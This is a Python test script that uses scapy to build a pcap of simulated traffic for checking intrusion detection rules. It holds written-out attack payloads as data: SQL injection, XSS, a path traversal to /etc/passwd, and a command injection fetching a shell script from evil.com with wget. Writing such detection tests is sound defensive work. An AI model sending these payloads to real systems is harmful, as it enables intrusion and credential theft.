# Author cybalp
# PATH tests/generate_pcap.py
# Description Generates a dummy .pcap file containing simulated attack payloads for testing purposes.

from scapy.all import IP, TCP, Raw, wrpcap
import os

def generate_test_traffic():
    print("Generating simulated attack traffic...")
    
    packets = [
        # 0. Normal, innocent traffic (NO warning should be given here)
        IP(src="10.0.0.5", dst="192.168.1.100") / TCP(sport=12345, dport=80) / Raw(load="GET /index.html HTTP/1.1\r\n"),
        
        # 1. SQL Injection (Should trigger Rule 1001: “UNION SELECT”)
        IP(src="10.0.0.6", dst="192.168.1.100") / TCP(sport=12346, dport=80) / Raw(load="GET /login?user=admin' UNION SELECT password FROM users\r\n"),
        
        # 2. XSS Payload (Should trigger Rule 1003: “<script>”)
        IP(src="10.0.0.7", dst="192.168.1.100") / TCP(sport=12347, dport=443) / Raw(load="POST /comment HTTP/1.1\r\n\r\n<script>alert('XSS')</script>"),
        
        # 3. Path Traversal (Should trigger Rule 1004: “../../../”)
        IP(src="10.0.0.8", dst="192.168.1.100") / TCP(sport=12348, dport=80) / Raw(load="GET /download?file=../../../etc/passwd HTTP/1.1\r\n"),
        
        # 4. Command Injection (Should trigger Rule 1005: “wget http”)
        IP(src="10.0.0.9", dst="192.168.1.100") / TCP(sport=12349, dport=8080) / Raw(load="POST /api/exec HTTP/1.1\r\n\r\n wget http://evil.com/shell.sh")
    ]
    output_file = "test_attacks.pcap"
    wrpcap(output_file, packets)
    print(f"Success! {output_file} created with {len(packets)} packets.")

if __name__ == "__main__":
    generate_test_traffic()